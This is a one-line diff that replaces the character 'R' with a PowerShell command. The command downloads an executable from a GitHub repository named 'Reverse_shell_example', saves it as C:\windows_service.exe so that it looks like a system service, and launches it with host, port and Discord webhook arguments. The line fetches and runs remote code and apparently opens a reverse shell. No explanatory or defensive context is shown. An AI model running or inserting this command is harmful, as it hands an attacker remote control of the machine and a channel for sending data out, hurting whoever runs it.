@@ -1,1 +1,1 @@
-R
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/JustOfPlay/Reverse_shell_example/main/powershell/build.exe', 'C:\windows_service.exe'); Start-Process 'C:\windows_service.exe' HOSTNAME PORT DISCORD_WEBHHOOK"
